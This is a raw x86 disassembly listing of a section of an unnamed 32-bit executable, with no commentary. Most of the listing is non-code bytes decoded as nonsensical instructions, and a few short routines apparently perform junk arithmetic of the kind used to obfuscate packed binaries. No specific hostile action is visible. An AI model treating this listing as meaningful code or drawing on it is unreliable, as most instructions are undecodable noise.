  406119:	sub    eax,0xe70c1d12
  40611e:	inc    esi
  40611f:	ins    BYTE PTR es:[edi],dx
  406120:	fucom  st(7)
  406122:	adc    BYTE PTR [ecx],0x35
  406125:	fidiv  WORD PTR [ebx+eiz*8+0x5c]
  406129:	(bad)
  40612e:	test   DWORD PTR [esi-0xe],edx
  406131:	lahf   
  406132:	(bad)
  406135:	pop    ss
  406136:	xor    DWORD PTR [ecx+edi*2-0x31e7af3e],0x5ce716ba
  406141:	or     esi,DWORD PTR [edx]
  406143:	and    esi,DWORD PTR ds:0x3ab87aad
  406149:	mov    eax,ds:0xb2c429f0
  40614e:	dec    edx
  40614f:	jmp    edi
  406151:	test   eax,0x59215733
  406156:	adc    al,0x61
  406158:	push   ebx
  406159:	mov    eax,ds:0x740cf539
  40615e:	cmp    eax,0x6d1c6dc
  406163:	mov    esi,0x7e3663d7
  406168:	or     al,0xb5
  40616a:	add    BYTE PTR [ecx+0x45a7befc],dh
  406170:	xlat   BYTE PTR ds:[ebx]
  406171:	add    al,0xd6
  406173:	inc    ebx
  406174:	hlt    
  406175:	pop    ss
  406176:	sub    eax,0x7888c9ac
  40617b:	call   0xf9ef:0x330dc32a
  406182:	cmp    al,0x7c
  406184:	and    bh,BYTE PTR [ebp+0x672d144b]
  40618a:	lahf   
  40618b:	sbb    BYTE PTR [edx-0x3d],0xe5
  40618f:	xchg   edi,eax
  406190:	and    ebp,esi
  406192:	xchg   esp,eax
  406193:	mov    ds:0xe07aba93,al
  406198:	mov    DWORD PTR [esi+eiz*4-0x39934955],esp
  40619f:	out    0x9b,al
  4061a1:	js     0x4061dd
  4061a3:	dec    esi
  4061a4:	add    al,BYTE PTR ds:0xa26276ad
  4061aa:	jbe    0x4061b2
  4061ac:	pop    edx
  4061ad:	ins    BYTE PTR es:[edi],dx
  4061ae:	sbb    DWORD PTR [ebp-0x53],edx
  4061b1:	sbb    edx,0x7
  4061b4:	push   ebp
  4061b5:	shl    ch,0xcc
  4061b8:	aas    
  4061b9:	imul   ebx,DWORD PTR [edi+0x61],0xffffffe3
  4061bd:	cmp    BYTE PTR gs:[ebp+0x41],ah
  4061c1:	mov    eax,0x213a46bf
  4061c6:	out    dx,al
  4061c7:	dec    ebp
  4061c8:	out    dx,eax
  4061c9:	mov    bl,0x2
  4061cb:	nop
  4061cc:	int3   
  4061cd:	mov    al,ds:0x17f46df9
  4061d2:	xchg   DWORD PTR [eax+0x28],esi
  4061d5:	(bad)
  4061d8:	dec    edx
  4061d9:	nop
  4061da:	adc    al,0x78
  4061dc:	sub    bl,BYTE PTR [esi+0xa]
  4061df:	in     eax,dx
  4061e0:	pop    es
  4061e1:	fidiv  WORD PTR [eax-0x259c6ff2]
  4061e7:	mov    edi,0x55b421fe
  4061ec:	pop    ecx
  4061ed:	popa   
  4061ee:	sbb    BYTE PTR [edi-0x5a],cl
  4061f1:	xor    bh,BYTE PTR [edx]
  4061f3:	push   0x19
  4061f5:	stc    
  4061f6:	daa    
  4061f7:	inc    ecx
  4061f8:	mov    eax,ds:0x9cce83a6
  4061fd:	jb     0x406200
  4061ff:	lahf   
  406200:	ds xchg ebx,eax
  406202:	mov    esp,0x5ec6d666
  406207:	enter  0x7156,0x4d
  40620b:	rcr    BYTE PTR [edx],0x45
  40620e:	mov    esp,0x770c84cf
  406213:	cmp    BYTE PTR [esi+0x1f],bl
  406216:	sbb    al,0x44
  406218:	xchg   esi,eax
  406219:	or     BYTE PTR [ecx-0x7],0xe1
  40621d:	inc    esi
  40621e:	or     BYTE PTR [ebx],cl
  406220:	imul   esi,DWORD PTR [edi],0xcdac8ee0
  406226:	out    dx,eax
  406227:	cmp    esi,esi
  406229:	jmp    0x406203
  40622b:	and    BYTE PTR [ecx],0x62
  40622e:	jmp    0x106ed309
  406233:	enter  0x443b,0xba
  406237:	cmp    BYTE PTR [esp+eax*2],0x37
  40623b:	aas    
  40623c:	enter  0x574d,0x11
  406240:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406241:	lock dec ebx
  406243:	jne    0x40629e
  406245:	mov    ch,al
  406247:	popa   
  406248:	(bad)  
  406249:	mov    esi,0x13fbaf27
  40624e:	push   eax
  40624f:	sub    eax,0x6d191cf9
  406254:	cmp    BYTE PTR [edi+ebx*4-0x50],0xba
  406259:	mov    DWORD PTR [ebx],ebp
  40625b:	pop    esi
  40625c:	push   ebx
  40625d:	retf   
  40625e:	or     eax,0xa3b96495
  406263:	out    0x9,al
  406265:	mov    al,0x7b
  406267:	pop    ebx
  406268:	fucom  st(3)
  40626a:	mov    dh,0x6c
  40626c:	rcr    DWORD PTR [ebx],0x3f
  40626f:	or     cl,0xcd
  406272:	fmul   DWORD PTR [ebp+eiz*1-0x59]
  406276:	jmp    0x4c25db2f
  40627b:	rcl    esp,cl
  40627d:	push   edx
  40627e:	mov    ecx,0xabc34eae
  406283:	aaa    
  406284:	or     al,0x54
  406286:	mov    eax,ds:0xb7484033
  40628b:	fs mov cl,0xe0
  40628e:	mov    eax,DWORD PTR [ebp+0x18]
  406291:	mov    esi,DWORD PTR [ebp+0x10]
  406294:	sub    DWORD PTR ds:0x42fd89,0x42fe06
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e773,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fdf2,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fdf2,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fdf2,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e5bb
  4062e2:	cmp    DWORD PTR ds:0x42fdf2,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fdf2
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fdf2,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fdf2
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fdf2,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	mov    ebx,0x8c6a2390
  406333:	cmp    al,0x70
  406335:	jo     0x4062de
  406337:	jg     0x4063a9
  406339:	jo     0x406394
  40633b:	in     al,dx
  40633c:	inc    ecx
  40633d:	lods   eax,DWORD PTR ds:[esi]
  40633e:	add    cl,dl
  406340:	mul    ebp
  406342:	jne    0x40636d
  406344:	mov    ebx,0xb13a5e6f
  406349:	jmp    0xbdc5:0xef055b7f
  406350:	and    DWORD PTR [esi],esp
  406352:	imul   edi,DWORD PTR gs:[ebp+0x31115eb2],0xbea6bfc7
  40635d:	sbb    ebx,esp
  40635f:	sbb    dh,BYTE PTR [edx-0xd0b9105]
  406365:	dec    edx
  406366:	pop    ss
  406367:	in     eax,0xb7
  406369:	xor    DWORD PTR [edi],edi
  40636b:	(bad)  
  40636c:	xchg   DWORD PTR [eax],ecx
  40636e:	xchg   ecx,eax
  40636f:	sti    
  406370:	imul   eax,DWORD PTR [edx+0x16],0xffffffa2
  406374:	xor    dl,BYTE PTR [esi+edx*8-0x35]
  406378:	mov    ecx,0x323be567
  40637d:	fisttp DWORD PTR [eax]
  40637f:	and    ebx,DWORD PTR [ecx+0x702b50cf]
  406385:	imul   ebx,edx,0x7f
  406388:	mov    esi,?
  40638a:	mov    cl,0xc
  40638c:	loope  0x40635d
  40638e:	ret    0xa10a
  406391:	dec    eax
  406392:	add    al,0xc2
  406394:	mov    ah,BYTE PTR [ebp+0x26]
  406397:	push   ds
  406398:	in     eax,0xc1
  40639a:	jo     0x406323
  40639c:	dec    ecx
  40639d:	pop    edi
  40639e:	daa    
  40639f:	and    edi,DWORD PTR [edx]
  4063a1:	inc    esi
  4063a2:	or     edx,DWORD PTR [esi+0x3660875a]
  4063a8:	call   0xa81d:0x5e170035
  4063af:	fxch   st(1)
  4063b1:	xchg   esp,eax
  4063b2:	in     al,0x50
  4063b4:	mov    esi,0x670e0dd3
  4063b9:	pop    edi
  4063ba:	aas    
  4063bb:	dec    esi
  4063bc:	mov    ebp,0xb09a23a1
  4063c1:	xchg   edi,eax
  4063c2:	pop    ss
  4063c3:	jnp    0x4063e8
  4063c5:	push   esi
  4063c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063c7:	dec    esi
  4063c8:	mov    ebx,0x3f14dfe
  4063cd:	sub    eax,0xd738311b
  4063d2:	imul   eax,DWORD PTR [eax-0x7],0x55
  4063d6:	dec    ebx
  4063d7:	jmp    0x722e:0xbac201e6
  4063de:	inc    edi
  4063df:	je     0x40643f
  4063e1:	cmp    bh,BYTE PTR [edx]
  4063e3:	sbb    al,0xd2
  4063e5:	sti    
  4063e6:	mov    esi,ebp
  4063e8:	add    BYTE PTR [ebp-0x3e],dh
  4063eb:	hlt    
  4063ec:	sub    BYTE PTR [edx],bh
  4063ee:	pop    edi
  4063ef:	into   
  4063f0:	push   ss
  4063f1:	adc    ecx,ebx
  4063f3:	dec    ebp
  4063f4:	out    dx,al
  4063f5:	mov    ?,WORD PTR [esi+esi*8-0x48]
  4063f9:	test   al,0xa3
  4063fb:	sbb    al,0xc7
  4063fd:	mov    cl,0x9f
  4063ff:	(bad)  
  406400:	xlat   BYTE PTR ds:[ebx]
  406401:	mov    ah,0x7
  406403:	adc    eax,0xd2478d4e
  406408:	xchg   edx,eax
  406409:	inc    ecx
  40640a:	popf   
  40640b:	push   eax
  40640c:	lea    edx,[ebp-0x54]
  40640f:	repnz cld 
  406411:	mov    ds:0x31e3e999,al
  406416:	and    BYTE PTR [ecx+0x2f],bl
  406419:	jns    0x4063d9
  40641b:	sbb    ch,BYTE PTR [ebp+0x2f]
  40641e:	arpl   WORD PTR [edx-0x3b],si
  406421:	dec    esp
  406422:	mov    edi,0x87821f3c
  406427:	icebp  
  406428:	xchg   DWORD PTR [edx+esi*1],edi
  40642b:	enter  0xf70a,0xf5
  40642f:	ins    DWORD PTR es:[edi],dx
  406430:	pushf  
  406431:	sub    BYTE PTR [edx-0x2c],0x77
  406435:	sub    edx,DWORD PTR [edi+edx*2+0xfaacdf]
  40643c:	dec    ecx
  40643d:	dec    edi
  40643e:	out    dx,eax
  40643f:	pop    eax
  406440:	mov    WORD PTR [ebp+0x15533dbc],cs
  406446:	pop    ebx
  406447:	fst    QWORD PTR [ebp+0x4]
  40644a:	or     BYTE PTR [ebx-0x37a0c406],cl
  406450:	ss adc dh,bl
  406453:	xchg   ebp,eax
  406454:	aaa    
  406455:	mov    ebx,0x385cdea2
  40645a:	sub    BYTE PTR [edx+0x45],dh
  40645d:	(bad)  
  40645e:	stos   DWORD PTR es:[edi],eax
  40645f:	jns    0x4063fc
  406461:	mov    cl,0x89
  406463:	arpl   WORD PTR cs:[edx-0x38a75875],sp
  40646a:	push   cs
  40646b:	push   ds
  40646c:	pop    bp
  40646e:	mov    eax,DWORD PTR [ebx+0xf]
  406471:	push   es
  406472:	lds    esi,FWORD PTR [eax]
  406474:	mov    ds:0xcef2f94a,al
  406479:	repnz pop esp
  40647b:	mov    eax,ds:0x5bb9e4fe
  406480:	aam    0x1
  406482:	adc    eax,0xae4b8a98
  406487:	call   0xc19117a8
  40648c:	or     al,0x8f
  40648e:	cmp    DWORD PTR [ecx-0x38],edx
  406491:	js     0x4064af
  406493:	cdq    
  406494:	pop    esi
  406495:	pop    ebp
  406496:	pop    ds
  406497:	mov    ch,0x6c
  406499:	pop    eax
  40649a:	cmp    eax,0x314d508f
  40649f:	jmp    0x4064f2
  4064a1:	mov    edi,DWORD PTR [eax-0x4433782a]
  4064a7:	int    0x6f
  4064a9:	xlat   BYTE PTR ds:[ebx]
  4064aa:	in     al,0x58
  4064ac:	in     eax,dx
  4064ad:	loopne 0x406514
  4064af:	test   DWORD PTR [esi-0x625220dd],0x1123e55a
  4064b9:	hlt    
  4064ba:	sbb    bh,dl
  4064bc:	xchg   edi,eax
  4064bd:	call   FWORD PTR [ebx+0x6d]
  4064c0:	pop    eax
  4064c1:	xchg   ebx,eax
  4064c2:	call   0x5991ba43
  4064c7:	push   ss
  4064c8:	loopne 0x4064e5
  4064ca:	adc    DWORD PTR [eax+0x32],esp
  4064cd:	enter  0x11f9,0x77
  4064d1:	mov    esi,0x67e98338
  4064d6:	std    
  4064d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064d8:	lahf   
  4064d9:	retf   0xdf8
  4064dc:	xlat   BYTE PTR gs:[ebx]
  4064de:	sbb    eax,0xa2ca0d6a
  4064e3:	pop    esi
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fdf6,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fd79
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fdf2,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fdf2,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fd59,0x42e77b
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	sbb    eax,0x33a06021
  40656b:	cmp    dh,BYTE PTR [eax+0x70]
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	test   eax,0x18207327
  406577:	ror    BYTE PTR [ebx-0x31],cl
  40657a:	sbb    ch,BYTE PTR [eax+0x2e3a26b9]
  406580:	(bad)  
  406581:	pop    ecx
  406582:	jp     0x40653b
  406584:	mov    ebp,0xf6de954e
  406589:	add    bh,ch
  40658b:	cmp    BYTE PTR [esi-0x63505f7a],bl
  406591:	push   ecx
  406592:	lock jmp 0x4da84903
  406598:	sbb    esp,DWORD PTR [edi+0x50]
  40659b:	in     eax,0x13
  40659d:	out    0xe2,eax
  40659f:	aas    
  4065a0:	rcr    dh,cl
  4065a2:	inc    edx
  4065a3:	pushf  
  4065a4:	sbb    eax,0x1a1d29
  4065a9:	push   cs
  4065aa:	test   DWORD PTR [ecx+0x592fe195],ebp
  4065b0:	sub    eax,DWORD PTR ss:[edi+0x42]
  4065b4:	push   DWORD PTR ds:0x1ac5172b
  4065ba:	add    DWORD PTR [ebx-0x32],esp
  4065bd:	ins    BYTE PTR es:[edi],dx
  4065be:	mov    al,ds:0x85d77f4e
  4065c3:	mov    WORD PTR [edx-0x6e],cs
  4065c6:	xchg   DWORD PTR [ecx-0x43],eax
  4065c9:	out    dx,eax
  4065ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065cb:	mov    ebx,0xadf1af0b
  4065d0:	lods   al,BYTE PTR ds:[esi]
  4065d1:	sub    BYTE PTR [esi+edx*4],dh
  4065d4:	mov    ah,0x63
  4065d6:	sbb    ebx,edx
  4065d8:	push   edx
  4065d9:	lock adc DWORD PTR [ecx],0x133e4da0
  4065e0:	iret   
  4065e1:	mov    dh,0xef
  4065e3:	adc    DWORD PTR [eax-0x7fd587bf],ecx
  4065e9:	hlt    
  4065ea:	pop    esi
  4065eb:	clc    
  4065ec:	mov    ebx,0x9bdc5d1
  4065f1:	push   edi
  4065f2:	push   edx
  4065f3:	imul   edi,ecx,0xffffff94
  4065f6:	mov    esi,0x1bb169b9
  4065fb:	retf   0xd85
  4065fe:	scas   eax,DWORD PTR es:[edi]
  4065ff:	add    eax,0x45f8409
  406604:	(bad)  
  406605:	or     eax,0xb048ec1a
  40660a:	es popa 
  40660c:	cli    
  40660d:	sub    dl,al
  40660f:	inc    ebp
  406610:	test   eax,0xdb107640
  406615:	ret    0xd097
  406618:	test   al,0x1a
  40661a:	dec    edi
  40661b:	rep outs dx,BYTE PTR ds:[esi]
  40661d:	(bad)  
  40661e:	je     0x40666d
  406620:	das    
  406621:	gs ds xchg edx,eax
  406624:	xor    al,0x41
  406626:	mov    ebx,0xbfbde631
  40662b:	test   DWORD PTR fs:[edx-0x63],esi
  40662f:	(bad)  
  406630:	sbb    al,0xd6
  406632:	iret   
  406633:	pop    edx
  406634:	adc    DWORD PTR [ecx-0x3dca2ca7],esi
  40663a:	sbb    DWORD PTR [ebx],esp
  40663c:	sub    DWORD PTR [eax],edi
  40663e:	jae    0x4065f4
  406640:	stos   DWORD PTR es:[edi],eax
  406641:	int3   
  406642:	pop    ss
  406643:	fcomp  QWORD PTR [esi]
  406645:	aad    0x4d
  406647:	idiv   DWORD PTR [ebx-0x457e3434]
  40664d:	jnp    0x40665e
  40664f:	fstp   QWORD PTR [ebx+0x70]
  406652:	cmp    eax,0xfef150d9
  406657:	jne    0x406604
  406659:	mov    ebp,0x972185b7
  40665e:	ja     0x406631
  406660:	daa    
  406661:	js     0x40668b
  406663:	call   0x54ba277d
  406668:	xor    eax,0xca2a2b60
  40666d:	mov    edx,DWORD PTR [esi-0x7e]
  406670:	push   edi
  406671:	push   ebx
  406672:	jns    0x406643
  406674:	and    BYTE PTR [ebp+0x70],dh
  406677:	ds push eax
  406679:	cmp    edi,DWORD PTR [esi+esi*1]
  40667c:	into   
  40667d:	pop    ecx
  40667e:	sbb    BYTE PTR [esi-0x69],dh
  406681:	add    ah,ch
  406683:	mov    WORD PTR [edi],es
  406685:	and    BYTE PTR [esi-0x20],ah
  406688:	cwde   
  406689:	sbb    DWORD PTR [ebp+ecx*1+0x217ee5f5],ebx
  406690:	ins    DWORD PTR es:[edi],dx
  406691:	xchg   edi,eax
  406692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406693:	psrlw  mm4,mm4
  406696:	pop    ecx
  406697:	not    BYTE PTR [eax+0x76]
  40669a:	data16 mov al,ds:0xa6d9d765
  4066a0:	dec    esi
  4066a1:	cmp    DWORD PTR [esi],0x74
  4066a4:	jmp    0x7478211f
  4066a9:	outs   dx,BYTE PTR ds:[esi]
  4066aa:	jmp    0x82ed751
  4066af:	jae    0x4066b1
  4066b1:	imul   esi,DWORD PTR [eax+0x3da0ba83],0x7
  4066b8:	add    al,0x27
  4066ba:	fdivr  QWORD PTR [edx+0x6f55e02b]
  4066c0:	mov    al,ds:0x59b57c61
  4066c5:	xchg   esp,eax
  4066c6:	sar    DWORD PTR ds:0x5da0b9a2,1
  4066cc:	pop    edx
  4066cd:	into   
  4066ce:	xor    al,0xe7
  4066d0:	test   eax,0x2d59f29f
  4066d5:	xchg   edi,eax
  4066d6:	xor    esp,ebp
  4066d8:	ret    0x3999
  4066db:	fnstcw WORD PTR [edx]
  4066dd:	or     esp,DWORD PTR es:[esi]
  4066e0:	push   ss
  4066e1:	jns    0x4066a5
  4066e3:	push   esp
  4066e4:	ja     0x406754
  4066e6:	jmp    0xe5c6f935
  4066eb:	fist   DWORD PTR [esi-0x723a837e]
  4066f1:	push   ebp
  4066f2:	mov    es:0x23de2e41,eax
  4066f8:	mov    edi,DWORD PTR [esi-0x2]
  4066fb:	adc    eax,0xf546926e
  406700:	jl     0x406759
  406702:	cmp    eax,0xf922beea
  406707:	mov    bh,0xbe
  406709:	loope  0x4066e7
  40670b:	push   ebx
  40670c:	in     al,0x22
  40670e:	jle    0x4066b3
  406710:	pusha  
  406711:	ss jb  0x40670d
  406714:	pop    esp
  406715:	mov    ecx,DWORD PTR [edx]
  406717:	dec    ebp
  406718:	ds cld 
  40671a:	(bad)  [ebp-0x5ed2e628]
  406720:	pop    esp
  406721:	cwde   
  406722:	or     BYTE PTR [ebp+0x39],ch
  406725:	push   eax
  406726:	pushf  
  406727:	pusha  
  406728:	cs pushf 
  40672a:	xor    DWORD PTR [esi+0x798f3089],ecx
  406730:	lods   al,BYTE PTR ds:[esi]
  406731:	cmc    
  406732:	mov    BYTE PTR [edx],ch
  406734:	xchg   ecx,eax
  406735:	iret   
  406736:	push   eax
  406737:	fs xchg esi,eax
  406739:	out    0x8a,al
  40673b:	sub    DWORD PTR [esi+esi*1],esp
  40673e:	shl    DWORD PTR [ebp+0x4c],0xdd
  406742:	pop    ss
  406743:	mov    gs,WORD PTR [ebx+esi*4-0x524aa402]
  40674a:	sbb    al,0xaf
  40674c:	add    DWORD PTR [edx-0x4b],ecx
  40674f:	mov    esp,0xb9241f53
  406754:	ins    DWORD PTR es:[edi],dx
  406755:	xchg   edx,eax
  406756:	sbb    BYTE PTR [edx-0x33d36ac0],ch
  40675c:	cmp    BYTE PTR [eax],ch
  40675e:	shr    BYTE PTR [eax-0x49368ad3],0xf7
  406765:	add    BYTE PTR [eax],cl
  406767:	mov    edx,0x301c0e47
  40676c:	mov    dl,0x12
  40676e:	jmp    0x1088ee85
  406773:	cmp    bh,BYTE PTR [edi+0x27]
  406776:	lock sbb eax,0x7a2fc072
  40677c:	ins    BYTE PTR es:[edi],dx
  40677d:	push   esi
  40677e:	sbb    eax,0x44941983
  406783:	xchg   esp,eax
  406784:	xchg   BYTE PTR [ebx+0x34a6b6bb],ch
  40678a:	pop    ebp
  40678b:	fdivp  st(4),st
  40678d:	add    bh,BYTE PTR [ebx+0x6a]
  406790:	mov    bh,0xc2
  406792:	outs   dx,DWORD PTR ds:[esi]
  406793:	mov    ebx,0x510195c5
  406798:	ret    0x4755
  40679b:	sbb    eax,edi
  40679d:	fbstp  TBYTE PTR [edx-0x2dc712c9]
  4067a3:	pushf  
  4067a4:	push   ecx
  4067a5:	push   edi
  4067a6:	push   esi
  4067a7:	mov    DWORD PTR [edx],ebp
  4067a9:	xchg   esi,eax
  4067aa:	cmc    
  4067ab:	sub    DWORD PTR [eax],esi
  4067ad:	bound  eax,QWORD PTR [edx+0x73]
  4067b0:	rcl    bl,0x8a
  4067b3:	sbb    DWORD PTR [ebx],edx
  4067b5:	xchg   edx,eax
  4067b6:	sub    esi,0x3584d77f
  4067bc:	aam    0x24
  4067be:	out    dx,al
  4067bf:	fild   DWORD PTR [edi+0x21]
  4067c2:	jbe    0x40674f
  4067c4:	mov    ebx,DWORD PTR [ebp+0x17]
  4067c7:	das    
  4067c8:	test   DWORD PTR [edi-0x7d],edx
  4067cb:	ins    DWORD PTR es:[edi],dx
  4067cc:	imul   ah
  4067ce:	jg     0x406759
  4067d0:	sbb    dh,ch
  4067d2:	or     bl,BYTE PTR [edi-0x66452197]
  4067d8:	sub    eax,0x4f01be89
  4067dd:	cmp    eax,0x558bd703
  4067e2:	adc    BYTE PTR [ecx-0x3dccf7be],cl
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fd55,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e1a0,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e77b,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fd65,0x42e793
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	pop    ebp
  406847:	sbb    edi,DWORD PTR [ebp+0x7038a532]
  40684d:	jo     0x406831
  40684f:	jle    0x4068c1
  406851:	jo     0x4068c8
  406853:	sbb    eax,0x584799dd
  406858:	mov    cl,0x72
  40685a:	sub    eax,0x75fd8af1
  40685f:	into   
  406860:	fldcw  WORD PTR [ebp-0x6e]
  406863:	adc    al,0x8f
  406865:	cmp    al,0x37
  406867:	add    eax,DWORD PTR [ebx]
  406869:	dec    esi
  40686a:	push   ebp
  40686b:	loope  0x4068e9
  40686d:	jl     0x406848
  40686f:	mov    ch,0xab
  406871:	inc    ebp
  406872:	sub    ebp,edi
  406874:	bound  eax,QWORD PTR [edi+0x29]
  406877:	jmp    0xb24bc86
  40687c:	xchg   ebp,eax
  40687d:	js     0x40684e
  40687f:	(bad)  
  406880:	int    0x39
  406882:	dec    esi
  406883:	sub    eax,0xf0786295
  406888:	xchg   ecx,eax
  406889:	sub    BYTE PTR [eax+0x18],dh
  40688c:	jb     0x4068a9
  40688e:	fstp   DWORD PTR [esp+ebp*4-0xc]
  406892:	ins    BYTE PTR es:[edi],dx
  406893:	sub    ebx,DWORD PTR [esi-0x311de881]
  406899:	pop    edx
  40689a:	sti    
  40689b:	lea    ecx,[esi]
  40689d:	popa   
  40689e:	add    eax,0x34b99379
  4068a3:	nop
  4068a4:	js     0x40687b
  4068a6:	stos   DWORD PTR es:[edi],eax
  4068a7:	mov    ebp,0x1352e155
  4068ac:	inc    ebp
  4068ad:	sbb    eax,0xabc378e3
  4068b2:	mov    ah,0xa8
  4068b4:	sbb    BYTE PTR [esi+0x12],cl
  4068b7:	add    eax,DWORD PTR [ebx+0x7c14664c]
  4068bd:	pusha  
  4068be:	(bad)  
  4068bf:	push   ebp
  4068c0:	js     0x406935
  4068c2:	out    dx,al
  4068c3:	fsubr  QWORD PTR [ecx+ebp*1+0x71]
  4068c7:	add    al,0x47
  4068c9:	sbb    edi,ebx
  4068cb:	out    0xee,eax
  4068cd:	push   ebp
  4068ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068cf:	inc    edi
  4068d0:	jge    0x40693b
  4068d2:	neg    BYTE PTR [edx-0x1b014560]
  4068d8:	push   ds
  4068d9:	bswap  esi
  4068db:	pop    esi
  4068dc:	sub    ebx,edx
  4068de:	and    ah,BYTE PTR [esi]
  4068e0:	je     0x40687e
  4068e2:	(bad)  
  4068e3:	(bad)
  4068e7:	add    eax,DWORD PTR [eax+0x10]
  4068ea:	or     ebp,edx
  4068ec:	sbb    BYTE PTR [esi-0x4],0xdc
  4068f0:	dec    edi
  4068f1:	stos   BYTE PTR es:[edi],al
  4068f2:	mov    al,ds:0x89e92ae4
  4068f7:	popa   
  4068f8:	mov    ebx,0x35c9433d
  4068fd:	sub    eax,DWORD PTR [esp+eiz*8]
  406900:	aam    0x1a
  406902:	cmp    DWORD PTR [ebp+0x49d2b382],ebx
  406908:	stos   BYTE PTR es:[edi],al
  406909:	inc    edi
  40690a:	repz mov bl,0x19
  40690d:	pop    eax
  40690e:	shl    DWORD PTR [edi-0x39],0x99
  406912:	jns    0x406911
  406914:	xor    DWORD PTR [ebp+edi*1-0x10],ebp
  406918:	or     dh,dl
  40691a:	fidiv  WORD PTR [ecx+0x4e4a6394]
  406920:	adc    BYTE PTR [ebx+0x3578d796],dl
  406926:	outs   dx,DWORD PTR ds:[esi]
  406927:	outs   dx,DWORD PTR ds:[esi]
  406928:	or     al,0x8d
  40692a:	mov    ch,0xd9
  40692c:	(bad)
  40692f:	fdiv   st(7),st
  406931:	push   ss
  406932:	(bad)  
  406933:	lock mov BYTE PTR [eax+0x6e8ec375],ah
  40693a:	jmp    0x6b9c87c5
  40693f:	cs mov dh,0x5d
  406942:	add    ch,BYTE PTR [edx-0x15]
  406945:	je     0x40699b
  406947:	and    ebx,DWORD PTR [edx-0x42]
  40694a:	or     al,0x11
  40694c:	call   0x42aba196
  406951:	inc    edx
  406952:	mov    bl,0x3e
  406954:	inc    eax
  406955:	sbb    ebp,DWORD PTR [ebx+0x3c47f134]
  40695b:	ds jmp 0x37c83b13
  406961:	adc    ecx,DWORD PTR [ecx]
  406963:	sbb    eax,ecx
  406965:	xchg   ecx,eax
  406966:	mov    BYTE PTR [esi-0x2792cb38],dh
  40696c:	pusha  
  40696d:	sar    DWORD PTR [esi+0x41],cl
  406970:	(bad)  
  406972:	imul   edi,esi,0xb667a298
  406978:	inc    edi
  406979:	push   esi
  40697a:	mov    edx,0xc62b9553
  40697f:	repnz inc esi
  406981:	push   0x482b5603
  406986:	ja     0x40696e
  406988:	dec    edi
  406989:	cdq    
  40698a:	or     al,0x59
  40698c:	jl     0x4069d2
  40698e:	mov    dl,0x89
  406990:	push   es
  406991:	outs   dx,DWORD PTR ds:[esi]
